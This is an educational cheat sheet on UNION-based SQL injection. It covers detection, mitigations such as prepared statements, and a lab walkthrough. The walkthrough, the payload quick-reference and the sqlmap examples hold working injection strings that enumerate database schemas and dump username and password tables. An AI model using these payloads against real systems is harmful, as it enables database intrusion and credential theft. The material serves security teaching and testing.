# UNION-Based SQL Injection — Cheat Sheet

---

## Table of Contents
1. [What is UNION-Based SQL Injection?](#1-what-is-union-based-sql-injection)
2. [How It Works Technically](#2-how-it-works-technically)
3. [Real-World Attack Scenarios](#3-real-world-attack-scenarios)
4. [Detection Methods](#4-detection-methods)
5. [Mitigation Methods](#5-mitigation-methods)
6. [Safe Lab Walkthrough (Step-by-Step)](#6-safe-lab-walkthrough-step-by-step)
7. [Common Tools Used by Security Professionals](#7-common-tools-used-by-security-professionals)
8. [Quick Reference / Payload Cheat Sheet](#8-quick-reference--payload-cheat-sheet)
9. [Common Mistakes Beginners Make](#9-common-mistakes-beginners-make)

---

## 1. What is UNION-Based SQL Injection?

SQL injection (SQLi) happens when user-supplied input is inserted directly into a SQL query without proper sanitization or parameterization. This lets an attacker change the logic of the query.

**UNION-based SQLi** is a specific technique where the attacker uses SQL's `UNION` operator to combine the results of the original (vulnerable) query with a second query they control — allowing them to pull data from *other* tables in the database (usernames, passwords, database names, etc.) and have it displayed on the web page.

Think of it like this: the application asks the database *"show me the product with this ID"*, but the attacker changes the question to *"show me the product with this ID, **AND ALSO** show me every username and password in the users table."*

---

## 2. How It Works Technically

### The `UNION` operator
`UNION` combines the results of two or more `SELECT` statements into one result set. For it to work:

- **Both queries must return the same number of columns.**
- **The corresponding columns should have compatible data types.**

Example of a normal, safe UNION query:
```sql
SELECT name, price FROM products
UNION
SELECT username, password FROM users;
```

### Why this matters for injection
A vulnerable application might build a query like this behind the scenes:
```sql
SELECT id, name, description, price, stock FROM products WHERE id = '$id';
```

If `$id` comes straight from the URL (e.g., `?id=12`) with no sanitization, an attacker can inject their own `UNION SELECT` statement to append arbitrary data to the result.

---

## 3. Real-World Attack Scenarios

- **E-commerce sites:** Extracting customer records, credit card data, or admin credentials through a vulnerable product search or `?id=` parameter.
- **Login bypass leading to data extraction:** Combined with other SQLi techniques to first bypass login, then use UNION to dump the entire user table.
- **CMS/blog platforms:** Old or poorly coded plugins with vulnerable search/filter parameters have historically leaked entire databases (e.g., past real-world breaches involving outdated CMS plugins).
- **API endpoints:** Modern apps aren't immune — a backend API parameter (like `?id=` or `?category=`) passed unsanitized into a query is just as exploitable as a classic PHP page.
- **Chained attacks:** Attackers often use UNION-based SQLi first for reconnaissance (table/column names), then pivot to more advanced techniques (stacked queries, `INTO OUTFILE` to drop a web shell, etc.).

---

## 4. Detection Methods

### Manual detection (what you're practicing)
- Insert a single quote `'` into a parameter and look for a SQL error or a change in page behavior.
- Use `ORDER BY` to find the number of columns (see walkthrough below).
- Try boolean-based payloads like `?id=12 AND 1=1` vs `?id=12 AND 1=2` to see behavior differences.

### Automated / professional detection
- **Static Application Security Testing (SAST)** tools scan source code for unsanitized queries (e.g., string concatenation into SQL).
- **Dynamic Application Security Testing (DAST)** tools like **Burp Suite** or **OWASP ZAP** actively send payloads and observe responses.
- **Web Application Firewalls (WAFs)** can log/flag suspicious patterns like `UNION SELECT`, `information_schema`, etc.
- **Database query logging / auditing** — unusually long or malformed queries, or queries referencing `information_schema` from application accounts, are red flags for a SOC/blue team to alert on.
- **Error-based fingerprints** — SQL error messages appearing in HTTP responses (e.g., MySQL syntax errors) is itself a detection signal that input isn't sanitized.

---

## 5. Mitigation Methods

| Priority | Mitigation | Why it works |
|---|---|---|
| **#1 (Best)** | **Parameterized queries / Prepared statements** | User input is treated strictly as *data*, never as executable SQL code |
| **#2** | **ORM frameworks** (e.g., Sequelize, SQLAlchemy, Hibernate) | Abstract away raw SQL, reducing manual query-building mistakes |
| **#3** | **Input validation / allow-lists** | Reject unexpected characters, enforce expected data types/formats |
| **#4** | **Least privilege DB accounts** | The web app's DB user shouldn't have access to `information_schema`, other databases, or admin functions like `INTO OUTFILE` |
| **#5** | **Escaping input** (last resort, not primary defense) | Escapes special characters like `'` — but is error-prone and easy to bypass; never rely on this alone |
| **Defense-in-depth** | **WAF rules**, **error message suppression** (never show raw SQL errors to users), **regular code review**, **automated SAST/DAST scanning in CI/CD** | Adds extra layers so a single mistake doesn't lead to full compromise |

**Example — vulnerable vs. safe code (PHP/MySQLi):**

Vulnerable:
```php
$query = "SELECT * FROM products WHERE id = '" . $_GET['id'] . "'";
```

Safe (prepared statement):
```php
$stmt = $mysqli->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("s", $_GET['id']);
$stmt->execute();
```

---

## 6. Safe Lab Walkthrough (Step-by-Step)

Practice this on **DVWA, SQLi-Labs, TryHackMe rooms, or HTB machines** — never on live/production sites.

### Step 1: Confirm the injection point
```sql
?id=12'
```
If you see a SQL syntax error or the page behaves differently than `?id=12`, the parameter is likely injectable.

### Step 2: Find the number of columns (using `ORDER BY`)
Increase the number until the query breaks (errors out or the page changes):
```sql
?id=12' ORDER BY 1 --+
?id=12' ORDER BY 2 --+
?id=12' ORDER BY 3 --+
?id=12' ORDER BY 4 --+
?id=12' ORDER BY 5 --+
?id=12' ORDER BY 6 --+   <-- this one errors out
```
If `ORDER BY 6` breaks but `ORDER BY 5` works, the query has **5 columns**.

> `--+` comments out the rest of the original query. In MySQL, `-- ` (with a trailing space) or `#` also work depending on context.

### Step 3: Find which columns are reflected on the page
Use `UNION SELECT` with dummy numbers matching your column count:
```sql
?id=12' UNION SELECT 1,2,3,4,5 --+
```
Since `id=12` is likely a valid/real ID, the original query may return a row, "hiding" your UNION row. To force it to fail (so your injected row is what's shown), use an ID that doesn't exist:
```sql
?id=-1' UNION SELECT 1,2,3,4,5 --+
?id=999999' UNION SELECT 1,2,3,4,5 --+
```
Whichever numbers appear on the page (e.g., `2` and `3`) are your **usable/reflected columns** — inject your data extraction there.

### Step 4: Extract basic database info
Replace a reflected column number with a useful function:
```sql
?id=-1' UNION SELECT 1,2,database(),4,5 --+      -- current database name
?id=-1' UNION SELECT 1,2,version(),4,5 --+       -- database version
?id=-1' UNION SELECT 1,2,user(),4,5 --+          -- current DB user (note: user(), not username())
?id=-1' UNION SELECT 1,2,@@version,4,5 --+       -- alternative version syntax
```

### Step 5: Enumerate other databases
`information_schema` is a built-in metadata database that lists every database, table, and column on the server.

| What you want | Table to query | Column to query |
|---|---|---|
| All database names | `information_schema.schemata` | `schema_name` |
| All table names | `information_schema.tables` | `table_name` |
| All column names | `information_schema.columns` | `column_name` |

```sql
?id=-1' UNION SELECT 1,2,schema_name,4,5 FROM information_schema.schemata --+
```

### Step 6: Enumerate tables inside a specific database
```sql
?id=-1' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema='synnefo' --+
```
Tip: if you don't know the current database name yet, use `database()` instead of hardcoding it:
```sql
?id=-1' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema=database() --+
```

### Step 7: Enumerate columns of a specific table
```sql
?id=-1' UNION SELECT 1,2,column_name,4,5 FROM information_schema.columns WHERE table_name='users' --+
```

### Step 8: Combine multiple results with `GROUP_CONCAT()`
Since only one row is usually visible at a time, `GROUP_CONCAT()` merges multiple rows into a single comma-separated string — very useful when only one column is reflected.

```sql
-- Get ALL table names in one shot
?id=-1' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database() --+

-- Get ALL column names of the 'users' table in one shot
?id=-1' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name='users' --+
```

### Step 9: Dump the actual data
Once you know the table is `users` and columns are `username`, `password`:
```sql
?id=-1' UNION SELECT 1,2,username,password,5 FROM users --+
```
Or combine into one column with a separator so it's easier to read:
```sql
?id=-1' UNION SELECT 1,2,group_concat(username,0x3a,password),4,5 FROM users --+
```
(`0x3a` is the hex code for `:`, used as a separator between username and password.)

### Full example chain (5-column app, based on the notes above)
```sql
?id=-1' UNION SELECT 1,2,3,4,5 --+
?id=-1' UNION SELECT 1,2,database(),4,5 --+
?id=-1' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database() --+
?id=-1' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name='users' --+
?id=-1' UNION SELECT 1,2,group_concat(username,0x3a,password),4,5 FROM users --+
```

---

## 7. Common Tools Used by Security Professionals

| Tool | Purpose |
|---|---|
| **sqlmap** | Automates detection and exploitation of SQL injection (including UNION-based); can dump databases, tables, and even get an OS shell in some configurations |
| **Burp Suite** | Intercepting proxy for manually crafting/replaying requests, plus an active scanner for finding injection points |
| **OWASP ZAP** | Free, open-source alternative to Burp Suite for automated and manual web app testing |
| **DVWA / bWAPP / SQLi-Labs** | Intentionally vulnerable practice applications for learning safely |
| **TryHackMe / Hack The Box** | Guided and self-paced labs/rooms specifically covering SQLi |
| **Hackbar / SQLiPy (Burp extension)** | Browser/Burp helper extensions for quickly testing payloads |
| **jSQL Injection** | GUI-based Java tool for automated SQL injection testing |

**Example sqlmap usage (lab environment only):**
```bash
sqlmap -u "http://target-lab/page.php?id=12" --dbs
sqlmap -u "http://target-lab/page.php?id=12" -D synnefo --tables
sqlmap -u "http://target-lab/page.php?id=12" -D synnefo -T users --dump
```

---

## 8. Quick Reference / Payload Cheat Sheet

```sql
-- Test for injection
' 
"

-- Find column count
' ORDER BY 1 --+
' ORDER BY N --+   (increase N until it errors)

-- Find reflected columns
' UNION SELECT 1,2,3,4,5 --+

-- Basic info
' UNION SELECT 1,2,database(),4,5 --+
' UNION SELECT 1,2,version(),4,5 --+
' UNION SELECT 1,2,user(),4,5 --+
' UNION SELECT 1,2,current_user(),4,5 --+

-- Enumerate databases
' UNION SELECT 1,2,schema_name,4,5 FROM information_schema.schemata --+

-- Enumerate tables
' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema=database() --+

-- Enumerate columns
' UNION SELECT 1,2,column_name,4,5 FROM information_schema.columns WHERE table_name='TABLE_HERE' --+

-- Dump with GROUP_CONCAT
' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database() --+
' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name='users' --+
' UNION SELECT 1,2,group_concat(username,0x3a,password),4,5 FROM users --+

-- Comment styles (MySQL)
--+
-- (space after --)
#
```

---

## 9. Common Mistakes Beginners Make

- **Forgetting the space/`+` after `--`** — in MySQL, `--` needs a trailing space or character (like `+` in a URL, which decodes to a space) to be treated as a comment.
- **Mismatched column count** — `UNION SELECT` will always error if the number of columns doesn't match the original query.
- **Data type mismatches** — putting a string where the original query expects an integer (or vice versa) can cause errors; use `NULL` as a safe placeholder while testing column count/type.
- **Using a valid existing ID** — if `?id=12` is a real row, the original query's data may display instead of your UNION row. Use an ID that doesn't exist (e.g., `-1` or `999999`) to force only your injected data to show.
- **Confusing `user()` with `username()`** — MySQL's function is `user()` (or `current_user()`), not `username()`.
- **Not accounting for input filtering** — some apps strip spaces, quotes, or keywords like `UNION`/`SELECT`. Professionals study filter bypass techniques (comments like `/**/`, case variation, encoding) — but always only in authorized labs.

---
